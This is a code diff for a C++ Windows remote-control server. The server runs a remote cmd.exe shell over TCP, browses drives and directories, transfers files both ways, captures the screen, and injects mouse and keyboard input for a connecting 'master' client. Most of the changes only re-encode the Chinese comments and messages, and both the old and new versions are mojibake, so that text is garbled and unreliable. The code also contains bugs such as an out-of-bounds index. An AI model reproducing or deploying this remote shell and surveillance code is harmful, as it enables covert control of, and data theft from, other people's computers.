@@ -30,11 +30,11 @@ Server::~Server()
 
 BOOL Server::CreateServer(const char* szIp, u_short nPort)
 {
-	//1.´´½¨tcp¿Í»§¶Ë
+	//1.åˆ›å»ºtcpå®¢æˆ·ç«¯
 	BOOL bRet = m_tcpSocket.CreateSocket();
 	if (!bRet)
 	{
-		cout << "tcp¿Í»§¶Ë´´½¨Ê§°Ü" << endl;
+		cout << "tcpå®¢æˆ·ç«¯åˆ›å»ºå¤±è´¥" << endl;
 		return FALSE;
 	}
 
@@ -43,9 +43,9 @@ BOOL Server::CreateServer(const char* szIp, u_short nPort)
 		m_tcpSocket.CloseSocket();
 		return 0;
 	}
-	cout << "IP Address:  "<<szIp<<"  Port: "<<nPort<<" ÓÃ»§ÒÑ¾­Á¬½Ó¡£¡£¡£¡£" << endl;
+	cout << "IP Address:  "<<szIp<<"  Port: "<<nPort<<" ç”¨æˆ·å·²ç»è¿æ¥ã€‚ã€‚ã€‚ã€‚" << endl;
 
-	//Õâ¸öÏß³ÌÓÃÀ´½ÓÊÜÆÁÄ»Êı¾İ£¬
+	//è¿™ä¸ªçº¿ç¨‹ç”¨æ¥æ¥å—å±å¹•æ•°æ®ï¼Œ
 	HANDLE hHandleSreen = CreateThread(NULL, 0, SreenProc, this, 0, NULL);
 	return TRUE;
 }
@@ -71,12 +71,12 @@ BOOL Server::RunServer()
 {
 	while (TRUE)
 	{
-		//½ÓÊÜ°üÍ·ºÍÊı¾İ
+		//æ¥å—åŒ…å¤´å’Œæ•°æ®
 		PKGHDR hdr;
 
 		int nRet = m_tcpSocket.Recv( (char*)&hdr,sizeof(hdr));
 
-		//ÔÙÊÕ°üÌå
+		//å†æ”¶åŒ…ä½“
 		LPBYTE pBuff = NULL;
 		if (hdr.m_nLen > 0)
 		{
@@ -90,71 +90,71 @@ BOOL Server::RunServer()
 			}
 		}
 
-			//´¦ÀíÊı¾İ
+			//å¤„ç†æ•°æ®
 			switch (hdr.m_cmd)
 			{
 			case DT_CMD:
 			{
-				//Æô¶¯CMD
+				//å¯åŠ¨CMD
 				OnCMD();
 			}
 			break;
 			case DT_SENDCMD:
 			{
-				//Ö´ĞĞCMDÃüÁî
+				//æ‰§è¡ŒCMDå‘½ä»¤
 				OnSendCMD(pBuff, hdr.m_nLen);
 			}
 			break;
 			case DT_GETDIRVERS:
 			{
-				//»ñµÃÅÌ·û
+				//è·å¾—ç›˜ç¬¦
 				OnGetDrivers();
 			}
 			break;
 			case DT_GETFILEPATH:
 			{
-				//ä¯ÀÀÎÄ¼şĞÅÏ¢
+				//æµè§ˆæ–‡ä»¶ä¿¡æ¯
 				OnGetFilePATH(pBuff,hdr.m_nLen);
 			}
 			break;
 			case DT_FILE_TAR_PATH:
 			{
-				//ÉÏ´«ÎÄ¼ş->»ñÈ¡ÉÏ´«ÎÄ¼şÂ·¾¶
+				//ä¸Šä¼ æ–‡ä»¶->è·å–ä¸Šä¼ æ–‡ä»¶è·¯å¾„
 				OnCreatrFile(pBuff, hdr.m_nLen);
 			}
 			break;
 			case DT_FILE_UPLOAD:
 			{
-				//ÉÏ´«ÎÄ¼ş->¿ªÊ¼ÉÏ´«
+				//ä¸Šä¼ æ–‡ä»¶->å¼€å§‹ä¸Šä¼ 
 				OnWriteFile(pBuff, hdr.m_nLen);
 			}
 			break;
 			case  DT_FILE_UPLOAD_OVER:
 			{
-				//ÉÏ´« ->ÎÄ¼şÒÑ¾­´«ÊäÍê±Ï
+				//ä¸Šä¼  ->æ–‡ä»¶å·²ç»ä¼ è¾“å®Œæ¯•
 				OnWriteFileOver();
 			}
 			break;
 			case DT_FILE_DOWNLOAD:
 			{
-				//ÏÂÔØ->Ğ´ÈëÏÂÔØ ÎÄ¼şÊı¾İ
+				//ä¸‹è½½->å†™å…¥ä¸‹è½½ æ–‡ä»¶æ•°æ®
 				OnCreateUpDownFile(pBuff, hdr.m_nLen);
 			}
 			break;
 			case DT_SCREENSTART:
 			{
-				//¿ªÆôÔ¶³ÌÆÁÄ»Ïß³Ì
+				//å¼€å¯è¿œç¨‹å±å¹•çº¿ç¨‹
 				isScreen = TRUE;
 			}
 			break;
 			case DT_SCREENSTOP:
 			{
-				//Í£Ö¹ÆÁÄ»¹²ÏíÏß³Ì
+				//åœæ­¢å±å¹•å…±äº«çº¿ç¨‹
 				isScreen = FALSE;
 			}
 			case DT_MOUSEMOVE:
 			{ 
-				//ÏìÓ¦Êó±êÊÂ¼ş
+				//å“åº”é¼ æ ‡äº‹ä»¶
 				PONMOUSE pt = (PONMOUSE)pBuff;
 				if (pt != nullptr)
 				{
@@ -164,7 +164,7 @@ BOOL Server::RunServer()
 			break;
 			case  DT_KEYBOADEVENT:
 			{
-				//ÏìÓ¦¼üÅÌÊÂ¼ş
+				//å“åº”é”®ç›˜äº‹ä»¶
 				UINT* pChar = (UINT*)pBuff;
 				if (pChar != nullptr)
 				{
@@ -179,45 +179,45 @@ BOOL Server::RunServer()
     return 0;
 }
 
-//´¦ÀíÊó±êÃüÁî
+//å¤„ç†é¼ æ ‡å‘½ä»¤
 void Server ::MouseEvent(PONMOUSE MousePt)
 {
 	switch (MousePt->_MouseCmd)
 	{
-		//´¦ÀíÊó±êÒÆ¶¯
+		//å¤„ç†é¼ æ ‡ç§»åŠ¨
 	case MOUSEMOVE:
 	{
 		MouseMove(MousePt);
-		printf("µ±Ç°Êó±ê×ø±êx£º%d--y£º%d\r\n", MousePt->_x, MousePt->_Y);
+		printf("å½“å‰é¼ æ ‡åæ ‡xï¼š%d--yï¼š%d\r\n", MousePt->_x, MousePt->_Y);
 	}
 	break;
 	case LMOUSEDOWN:
 	{
 		MouseLbuttonDown(MousePt);
-		printf("Êó±ê×ó¼ü°´ÏÂ×ø±êx£º%d--y£º%d\r\n", MousePt->_x, MousePt->_Y);
+		printf("é¼ æ ‡å·¦é”®æŒ‰ä¸‹åæ ‡xï¼š%d--yï¼š%d\r\n", MousePt->_x, MousePt->_Y);
 	}
 	break;
 	case LMOUSEUP:
 	{
 		MouseLbuttonUp(MousePt);
-		printf("Êó±ê×ó¼üµ¯Æğ×ø±êx£º%d--y£º%d\r\n", MousePt->_x, MousePt->_Y);
+		printf("é¼ æ ‡å·¦é”®å¼¹èµ·åæ ‡xï¼š%d--yï¼š%d\r\n", MousePt->_x, MousePt->_Y);
 	}
 	break;
 	case RMOUSEDOWN:
 	{
 		MouseRbuttonDown(MousePt);
-		printf("Êó±êÓÒ¼ü°´ÏÂ×ø±êx£º%d--y£º%d\r\n", MousePt->_x, MousePt->_Y);
+		printf("é¼ æ ‡å³é”®æŒ‰ä¸‹åæ ‡xï¼š%d--yï¼š%d\r\n", MousePt->_x, MousePt->_Y);
 	}
 	break;
 	case RMOUSEUP:
 	{
 		MouseRbuttonUp(MousePt);
-		printf("Êó±êÓÒ¼üµ¯Æğ×ø±êx£º%d--y£º%d\r\n", MousePt->_x, MousePt->_Y);
+		printf("é¼ æ ‡å³é”®å¼¹èµ·åæ ‡xï¼š%d--yï¼š%d\r\n", MousePt->_x, MousePt->_Y);
 	}
 	break;
 	}
 
-	//ÇåÀí½ÓÊÕµÄÊó±ê×ÊÔ´
+	//æ¸…ç†æ¥æ”¶çš„é¼ æ ‡èµ„æº
 	if (MousePt != NULL)
 	{
 		delete[](LPBYTE)MousePt;
@@ -229,7 +229,7 @@ void Server::KeyBoardEvent(UINT* pChar)
 	keybd_event(*pChar, 0, KEYEVENTF_EXTENDEDKEY, 0);
 	keybd_event(*pChar, 0, KEYEVENTF_KEYUP, 0);
 	Sleep(20);
-	printf("°´ÏÂÁË%c\r\n", *pChar);
+	printf("æŒ‰ä¸‹äº†%c\r\n", *pChar);
 	if (pChar != NULL)
 	{
 		delete[](LPBYTE)pChar;
@@ -237,21 +237,21 @@ void Server::KeyBoardEvent(UINT* pChar)
 }
 
 
-//´ò¿ªCMD¿ØÖÆÌ¨
+//æ‰“å¼€CMDæ§åˆ¶å°
 void Server::OnCMD()
 {
-	//Í¬²½Ëø
+	//åŒæ­¥é”
 	g_lock.Lock();
-	//×Ó½ø³ÌĞèÒªÄÃµ½¸¸½ø³Ì¾ä±ú£¬ĞèÒª°²È«ÊôĞÔ
+	//å­è¿›ç¨‹éœ€è¦æ‹¿åˆ°çˆ¶è¿›ç¨‹å¥æŸ„ï¼Œéœ€è¦å®‰å…¨å±æ€§
 	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES),NULL,TRUE };
-	//´´½¨¹ÜµÀ 1
+	//åˆ›å»ºç®¡é“ 1
 	BOOL bRet = CreatePipe(&hRead, &hCmdWrite, &sa, 0);
 	if (!bRet)
 	{
 		printf("Create Filed");
 		return;
 	}
-	//´´½¨¹ÜµÀ 2
+	//åˆ›å»ºç®¡é“ 2
 	bRet = CreatePipe(&hCmdRead, &hWrite, &sa, 0);
 	if (!bRet)
 	{
@@ -259,7 +259,7 @@ void Server::OnCMD()
 		return;
 	}
 
-	//Æô¶¯×Ó½ø³Ì £¨¸¸½ø³ÌÏò×Ó½ø³Ì·¢Êı¾İ£¬×Ó½ø³ÌĞèÒªÄÃµ½¸¸½ø³Ì¾ä±ú£©
+	//å¯åŠ¨å­è¿›ç¨‹ ï¼ˆçˆ¶è¿›ç¨‹å‘å­è¿›ç¨‹å‘æ•°æ®ï¼Œå­è¿›ç¨‹éœ€è¦æ‹¿åˆ°çˆ¶è¿›ç¨‹å¥æŸ„ï¼‰
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
 	//Sleep(100);
@@ -272,7 +272,7 @@ void Server::OnCMD()
 
 	ZeroMemory(&pi, sizeof(pi));
 
-	//Æô¶¯CMD
+	//å¯åŠ¨CMD
 	TCHAR cmd[MAX_PATH] = "cmd.exe";
 	bRet = CreateProcess(
 		NULL,
@@ -305,22 +305,22 @@ void Server::OnCMD()
 	m_tcpSocket.Send((char*)&pkgSendCmd, sizeof(pkgSendCmd));
 	m_tcpSocket.Send(strBuff, dwBytesReaded + 1);
 
-	memset(strBuff, 0, sizeof(strBuff));  //Çå¿Õ»º³åÇø
+	memset(strBuff, 0, sizeof(strBuff));  //æ¸…ç©ºç¼“å†²åŒº
 	Sleep(100);
 	
-	printf("´ò¿ªcmd¿ØÖÆÌ¨");
+	printf("æ‰“å¼€cmdæ§åˆ¶å°");
 	g_lock.UnLock();
 	
 }
 
-//Ö´ĞĞCMD
+//æ‰§è¡ŒCMD
 void Server::OnSendCMD(LPBYTE pCmd, DWORD dwSize)
 {
 	g_lock.Lock();
 
 	DWORD dwBytesWrited = 0;
 
-	WriteFile(                    //Ğ´ÈëÎÄ¼ş
+	WriteFile(                    //å†™å…¥æ–‡ä»¶
 		hWrite,
 		pCmd,
 		dwSize,
@@ -331,9 +331,9 @@ void Server::OnSendCMD(LPBYTE pCmd, DWORD dwSize)
 	char  strBuff[0x10000] = { 0 };
 	DWORD dwBytesReaded = 0;
 	while (PeekNamedPipe(hRead, NULL, 0, NULL, &dwBytesAvail, NULL)
-		&& dwBytesAvail > 0) //Ñ­»·ÅĞ¶Ï1sÄÚ¹ÜµÀÖĞÊÇ·ñÓĞÊı¾İ£¬ÓĞµÄ»°¼ÌĞøÑ­»·£¬Ã»ÓĞÔòÍË³ö
+		&& dwBytesAvail > 0) //å¾ªç¯åˆ¤æ–­1så†…ç®¡é“ä¸­æ˜¯å¦æœ‰æ•°æ®ï¼Œæœ‰çš„è¯ç»§ç»­å¾ªç¯ï¼Œæ²¡æœ‰åˆ™é€€å‡º
 	{
-	ReadFile(   //¶Á¹ÜµÀÊı¾İ
+	ReadFile(   //è¯»ç®¡é“æ•°æ®
 		hRead, 
 		strBuff, 
 		0x10000,
@@ -348,7 +348,7 @@ void Server::OnSendCMD(LPBYTE pCmd, DWORD dwSize)
 	m_tcpSocket.Send((char*)&pkgSendCmd, sizeof(pkgSendCmd));
 	m_tcpSocket.Send(strBuff, dwBytesReaded + 1);
 
-	memset(strBuff, 0, sizeof(strBuff));  //Çå¿Õ»º³åÇø
+	memset(strBuff, 0, sizeof(strBuff));  //æ¸…ç©ºç¼“å†²åŒº
 	}
 
 	g_lock.UnLock();
@@ -362,15 +362,15 @@ void Server::OnGetFilePATH(LPBYTE szbuff, DWORD dwSize)
 	strcpy(dirNew, (char*)szbuff);
 	if (dirNew[-1] != ' \\ ')
 	{
-		strcat(dirNew, "\\");		// ÔÚÄ¿Â¼ºóÃæ¼ÓÉÏ"\\*.*"½øĞĞµÚÒ»´ÎËÑË÷
+		strcat(dirNew, "\\");		// åœ¨ç›®å½•åé¢åŠ ä¸Š"\\*.*"è¿›è¡Œç¬¬ä¸€æ¬¡æœç´¢
 	}
-	strcat(dirNew, "*.*");    // ´ÅÅÌËÑË÷
+	strcat(dirNew, "*.*");    // ç£ç›˜æœç´¢
 
 	intptr_t handle;
 	_finddata_t findData;
 
 	handle = _findfirst(dirNew, &findData);
-	if (handle == -1)        // ¼ì²éÊÇ·ñ³É¹¦£¬Ê§°Ü·µ»Ø
+	if (handle == -1)        // æ£€æŸ¥æ˜¯å¦æˆåŠŸï¼Œå¤±è´¥è¿”å›
 		return;
 
 	do
@@ -379,16 +379,16 @@ void Server::OnGetFilePATH(LPBYTE szbuff, DWORD dwSize)
 		{
 			if (strcmp(findData.name, ".") == 0 || strcmp(findData.name, "..") == 0)
 				continue;
-			cout <<"Ãû³Æ: "<< dirNew << "    ÀàĞÍ£º< ÎÄ¼ş¼Ğ>"
-				<< "´óĞ¡£º" << findData.size << "Ê±¼ä" << findData.time_write << endl;
+			cout <<"åç§°: "<< dirNew << "    ç±»å‹ï¼š< æ–‡ä»¶å¤¹>"
+				<< "å¤§å°ï¼š" << findData.size << "æ—¶é—´" << findData.time_write << endl;
 
-			// ÔÚÄ¿Â¼ºóÃæ¼ÓÉÏ"\\"ºÍËÑË÷µ½µÄÄ¿Â¼Ãû½øĞĞÏÂÒ»´ÎËÑË÷
+			// åœ¨ç›®å½•åé¢åŠ ä¸Š"\\"å’Œæœç´¢åˆ°çš„ç›®å½•åè¿›è¡Œä¸‹ä¸€æ¬¡æœç´¢
 			strcpy(dirNew, (char*)szbuff);
 			strcat(dirNew, "\\");
 			strcat(dirNew, findData.name);
 
 
-			FILEINFOo pkgFileInfo;
+			FILEINFO pkgFileInfo;
 			memcpy(pkgFileInfo.FileName, dirNew, sizeof(dirNew));
 			pkgFileInfo.FileType = 1;
 			//pkgFileInfo.FileSize = findData.size;
@@ -404,16 +404,16 @@ void Server::OnGetFilePATH(LPBYTE szbuff, DWORD dwSize)
 		}
 		else if(findData.size)
 		{
-			cout << "Ãû³Æ£º" << dirNew << "    ÀàĞÍ£º< ÎÄ¼ş>"
-				<< "´óĞ¡£º" << findData.size << "Ê±¼ä" << findData.time_write << endl;
+			cout << "åç§°ï¼š" << dirNew << "    ç±»å‹ï¼š< æ–‡ä»¶>"
+				<< "å¤§å°ï¼š" << findData.size << "æ—¶é—´" << findData.time_write << endl;
 
-			// ÔÚÄ¿Â¼ºóÃæ¼ÓÉÏ"\\"ºÍËÑË÷µ½µÄÄ¿Â¼Ãû½øĞĞÏÂÒ»´ÎËÑË÷
+			// åœ¨ç›®å½•åé¢åŠ ä¸Š"\\"å’Œæœç´¢åˆ°çš„ç›®å½•åè¿›è¡Œä¸‹ä¸€æ¬¡æœç´¢
 			strcpy(dirNew, (char*)szbuff);
 			strcat(dirNew, "\\");
 			strcat(dirNew, findData.name);
 
 
-			FILEINFOo pkgFileInfo;
+			FILEINFO pkgFileInfo;
 			memcpy(pkgFileInfo.FileName, dirNew, sizeof(dirNew));
 			pkgFileInfo.FileType = 0;
 			//pkgFileInfo.FileSize = findData.size;
@@ -430,7 +430,7 @@ void Server::OnGetFilePATH(LPBYTE szbuff, DWORD dwSize)
 		
 	} while (_findnext(handle, &findData) == 0);
 
-	_findclose(handle);    // ¹Ø±ÕËÑË÷¾ä±ú
+	_findclose(handle);    // å…³é—­æœç´¢å¥æŸ„
 	/*
 	string path = szbuff;
 	string FullPathName=path.append("\\*.*");
@@ -443,21 +443,21 @@ void Server::OnGetFilePATH(LPBYTE szbuff, DWORD dwSize)
 	hError = ::FindFirstFile(path.c_str(), &WFD);
 	if (hError == INVALID_HANDLE_VALUE)
 	{
-		printf("ËÑË÷Ê§°Ü!");
+		printf("æœç´¢å¤±è´¥!");
 	}
 	while (::FindNextFile(hError, &WFD))
 	{
-		// ¹ıÂÇ.ºÍ..
+		// è¿‡è™‘.å’Œ..
 		if (strcmp(WFD.cFileName, ".") == 0
 			|| strcmp(WFD.cFileName, "..") == 0)
 		{
 			continue;
 		}
-		// ¹¹ÔìÍêÕûÂ·¾¶
+		// æ„é€ å®Œæ•´è·¯å¾„
 		FindData.cFileName;
 		printf(path.c_str(), "%s\\%s", Path, FindData.cFileName);
 		FileCount++;
-		// Êä³ö±¾¼¶µÄÎÄ¼ş
+		// è¾“å‡ºæœ¬çº§çš„æ–‡ä»¶
 		printf("\n%d  %s  ", FileCount, FullPathName);
 
 		/*
@@ -487,7 +487,7 @@ void Server::OnGetFilePATH(LPBYTE szbuff, DWORD dwSize)
 
 void Server::OnGetDrivers()
 {
-	//»ñÈ¡ÅÌ·û
+	//è·å–ç›˜ç¬¦
 	char aryBuff[MAXWORD] = { 0 };
 	DWORD dwBytes = GetLogicalDriveStrings(sizeof(aryBuff), aryBuff);
 
@@ -515,36 +515,36 @@ void Server::OnGetDrivers()
 
 void Server::OnCreatrFile(LPBYTE szbuff, DWORD dwSize)
 {
-	//´´½¨Ä¿±êÎÄ¼ş
+	//åˆ›å»ºç›®æ ‡æ–‡ä»¶
 	hFileDst = ::CreateFile(
 		(char*)szbuff,
 		GENERIC_WRITE,
 		FILE_SHARE_READ,
 		NULL,
-		CREATE_ALWAYS, //Ä¿±êÎÄ¼ş×ÜÊÇ´´½¨ĞÂÎÄ¼ş,Èç¹ûÎÄ¼şÒÑ¾­´æÔÚ,ÔòÇåµôÔ­ÎÄ¼şÄÚÈİ
+		CREATE_ALWAYS, //ç›®æ ‡æ–‡ä»¶æ€»æ˜¯åˆ›å»ºæ–°æ–‡ä»¶,å¦‚æœæ–‡ä»¶å·²ç»å­˜åœ¨,åˆ™æ¸…æ‰åŸæ–‡ä»¶å†…å®¹
 		FILE_ATTRIBUTE_NORMAL,
 		NULL);
 
 	if (hFileDst != INVALID_HANDLE_VALUE)
 	{
-		printf("´´½¨Ä¿±êÎÄ¼ş¾ä±ú³É¹¦\r\n");
+		printf("åˆ›å»ºç›®æ ‡æ–‡ä»¶å¥æŸ„æˆåŠŸ\r\n");
 		//delete[] hFileDst;
 	}
 }
 
 void Server::OnWriteFile(LPBYTE szbuff, DWORD dwSize)
 {
-	//Ğ´ÈëĞÂÎÄ¼ş
+	//å†™å…¥æ–°æ–‡ä»¶
 	DWORD dwBytesToWrite = 0;
 	BOOL bRet = ::WriteFile(
 		hFileDst,
 		szbuff,
-		dwSize, //¶ÁÈ¡ÁË¶àÉÙ×Ö½Ú,¾ÍĞ´Èë¶àÉÙ×Ö½Ú
+		dwSize, //è¯»å–äº†å¤šå°‘å­—èŠ‚,å°±å†™å…¥å¤šå°‘å­—èŠ‚
 		&dwBytesToWrite,
 		NULL);
 	if (bRet)
 	{
-		printf(" ÕıÔÚÉÏ´«ÎÄ¼ş£¬ÒÑ¾­ÉÏ´«ÁË:%d k\r\n", dwBytesToWrite);
+		printf(" æ­£åœ¨ä¸Šä¼ æ–‡ä»¶ï¼Œå·²ç»ä¸Šä¼ äº†:%d k\r\n", dwBytesToWrite);
 	}
 	delete[] szbuff;
 
@@ -552,14 +552,14 @@ void Server::OnWriteFile(LPBYTE szbuff, DWORD dwSize)
 
 void Server::OnWriteFileOver()
 {
-	//ÎÄ¼şÉÏ´«Íê±Ï¡¢¹Ø±ÕÄ¿±êÎÄ¼ş¾ä±ú
+	//æ–‡ä»¶ä¸Šä¼ å®Œæ¯•ã€å…³é—­ç›®æ ‡æ–‡ä»¶å¥æŸ„
 	CloseHandle(hFileDst);
-	printf("ÎÄ¼şÉÏ´«Íê±Ï");
+	printf("æ–‡ä»¶ä¸Šä¼ å®Œæ¯•");
 }
 
 void Server::OnCreateUpDownFile(LPBYTE szbuff, DWORD dwSize)
 {
-	//´ò¿ªÔ´ÎÄ¼ş
+	//æ‰“å¼€æºæ–‡ä»¶
 	hFileSrc = ::CreateFile(
 		(char*)szbuff,
 		GENERIC_READ,
@@ -569,16 +569,16 @@ void Server::OnCreateUpDownFile(LPBYTE szbuff, DWORD dwSize)
 		FILE_ATTRIBUTE_NORMAL,
 		NULL);
 
-	//Ã¿´ÎÉÏ´«64K
+	//æ¯æ¬¡ä¸Šä¼ 64K
 	const DWORD dwPerSize = 0x10000;
 	char aryBuff[dwPerSize] = { 0 };
 
-	//»ñÈ¡ÎÄ¼şµÄ×Ü´óĞ¡
+	//è·å–æ–‡ä»¶çš„æ€»å¤§å°
 	__int64 nTotalFileSize = 0;
 	GetFileSizeEx(hFileSrc, (PLARGE_INTEGER)&nTotalFileSize);
 
 	/*
-	//·¢ËÍÎÄ¼ş×Ü´óĞ¡£¬ÓÃÓÚÏÔÊ¾½ø¶È
+	//å‘é€æ–‡ä»¶æ€»å¤§å°ï¼Œç”¨äºæ˜¾ç¤ºè¿›åº¦
 	PKGHDR pkgFileSize;
 	pkgFileSize.m_cmd = DT_FILE_SIZE;
 	pkgFileSize.m_nLen = nTotalFileSize;
@@ -586,37 +586,37 @@ void Server::OnCreateUpDownFile(LPBYTE szbuff, DWORD dwSize)
 	//m_tcpSocket.Send((char*)"0", nTotalFileSize);
 	*/
 
-	//ÒÑ¾­´¦ÀíµÄÊı¾İµÄ´óĞ¡
+	//å·²ç»å¤„ç†çš„æ•°æ®çš„å¤§å°
 	__int64 nHanleFileSize = 0;
 
 	while (true)
 	{
-		//´ÓÔ´ÎÄ¼ş¶ÁÈ¡64K
+		//ä»æºæ–‡ä»¶è¯»å–64K
 		DWORD dwBytesToRead = 0;
 		BOOL bRet = ::ReadFile(
 			hFileSrc,
 			aryBuff,
 			sizeof(aryBuff),
-			&dwBytesToRead, //Êµ¼Ê¶ÁÈ¡µÄ×Ö½ÚÊı
+			&dwBytesToRead, //å®é™…è¯»å–çš„å­—èŠ‚æ•°
 			NULL);
 
-		// ·¢ËÍ´æ·Å¶ÁÈ¡µÄ×Ö½ÚµÄ»º´æÇøµ½±»¿Ø¶ËµÄĞÂÎÄ¼ş
+		// å‘é€å­˜æ”¾è¯»å–çš„å­—èŠ‚çš„ç¼“å­˜åŒºåˆ°è¢«æ§ç«¯çš„æ–°æ–‡ä»¶
 		PKGHDR pkgDownload;
 		pkgDownload.m_cmd = DT_FILE_DOWNLOAD;
 		pkgDownload.m_nLen = dwBytesToRead;
 		m_tcpSocket.Send((char*)&pkgDownload, sizeof(pkgDownload));
 		m_tcpSocket.Send(aryBuff, dwBytesToRead);
-		printf("ÎÄ¼şÏÂÔØÕıÔÚ¶ÁÈ¡--%d\r\n", dwBytesToRead);
+		printf("æ–‡ä»¶ä¸‹è½½æ­£åœ¨è¯»å–--%d\r\n", dwBytesToRead);
 
-		//ÅĞ¶ÏÎÄ¼şÊÇ·ñ¶ÁÈ¡Íê±Ï
+		//åˆ¤æ–­æ–‡ä»¶æ˜¯å¦è¯»å–å®Œæ¯•
 		nHanleFileSize += dwBytesToRead;
 
 		if (nHanleFileSize >= nTotalFileSize)
 		{
-			// ¹Ø±Õ¾ä±ú
+			// å…³é—­å¥æŸ„
 			OnWriteFileOverupDown();
 
-			//¸æËßÖ÷¿Ø¶ËÎÄ¼şÉÏ´«Íê±Ï¡¢¹Ø±Õ¾ä±ú
+			//å‘Šè¯‰ä¸»æ§ç«¯æ–‡ä»¶ä¸Šä¼ å®Œæ¯•ã€å…³é—­å¥æŸ„
 			PKGHDR pkgDownloadOver;
 			pkgDownloadOver.m_cmd = DT_FILE_DOWNLOAD_OVER;
 		    pkgDownloadOver.m_nLen = 0;
@@ -628,26 +628,26 @@ void Server::OnCreateUpDownFile(LPBYTE szbuff, DWORD dwSize)
 
 void Server::OnWriteFileOverupDown()
 {
-	//ÎÄ¼şÉÏ´«Íê±Ï¡¢¹Ø±Õ´ò¿ªÎÄ¼ş¾ä±ú
+	//æ–‡ä»¶ä¸Šä¼ å®Œæ¯•ã€å…³é—­æ‰“å¼€æ–‡ä»¶å¥æŸ„
 	CloseHandle(hFileSrc);
-	printf("ÎÄ¼şÏÂÔØÍê±Ï");
+	printf("æ–‡ä»¶ä¸‹è½½å®Œæ¯•");
 }
 
 void Server :: SendPreScreen()
 {
 
-	// »ñÈ¡´°¿Úµ±Ç°ÏÔÊ¾µÄ¼àÊÓÆ÷
-	HWND hWnd = GetDesktopWindow();//¸ù¾İĞèÒª¿ÉÒÔÌæ»»³É×Ô¼º³ÌĞòµÄ¾ä±ú 
+	// è·å–çª—å£å½“å‰æ˜¾ç¤ºçš„ç›‘è§†å™¨
+	HWND hWnd = GetDesktopWindow();//æ ¹æ®éœ€è¦å¯ä»¥æ›¿æ¢æˆè‡ªå·±ç¨‹åºçš„å¥æŸ„ 
 	HMONITOR hMonitor = MonitorFromWindow(hWnd, MONITOR_DEFAULTTONEAREST);
 
-	// »ñÈ¡¼àÊÓÆ÷Âß¼­¿í¶ÈÓë¸ß¶È
+	// è·å–ç›‘è§†å™¨é€»è¾‘å®½åº¦ä¸é«˜åº¦
 	MONITORINFOEX miex;
 	miex.cbSize = sizeof(miex);
 	GetMonitorInfo(hMonitor, &miex);
 	int cxLogical = (miex.rcMonitor.right - miex.rcMonitor.left);
 	int cyLogical = (miex.rcMonitor.bottom - miex.rcMonitor.top);
 
-	// »ñÈ¡¼àÊÓÆ÷ÎïÀí¿í¶ÈÓë¸ß¶È
+	// è·å–ç›‘è§†å™¨ç‰©ç†å®½åº¦ä¸é«˜åº¦
 	DEVMODE dm;
 	dm.dmSize = sizeof(dm);
 	dm.dmDriverExtra = 0;
@@ -656,7 +656,7 @@ void Server :: SendPreScreen()
 	int cyPhysical = dm.dmPelsHeight;
 
 
-	//´ÓÆÁÄ»¿½±´Êı¾İµ½ÄÚ´æÎ»Í¼
+	//ä»å±å¹•æ‹·è´æ•°æ®åˆ°å†…å­˜ä½å›¾
 	int nScreenWith = GetSystemMetrics(SM_CXSCREEN);
 	int nScreenHeigh = GetSystemMetrics(SM_CYSCREEN);
 
@@ -671,12 +671,12 @@ void Server :: SendPreScreen()
 	BitBlt(hDcMem, 0, 0, nScreenWith, nScreenHeigh,
 		hDcScreen, 0, 0, SRCCOPY);
 
-	//»ñÈ¡ÆÁÄ»Êı¾İ
+	//è·å–å±å¹•æ•°æ®
 	DWORD dwBufLen = nScreenHeigh * nScreenWith * sizeof(COLORREF);
 	LPBYTE pBuffBmp = new BYTE[dwBufLen];
 	GetBitmapBits(hBmpMem, dwBufLen, pBuffBmp);
 
-	//·¢ËÍÆÁÄ»Êı¾İ
+	//å‘é€å±å¹•æ•°æ®
 	PKGHDR hdr;
 	hdr.m_cmd = DT_SCREENSTART;
 	hdr.m_nLen = dwBufLen + sizeof(SCREEN);
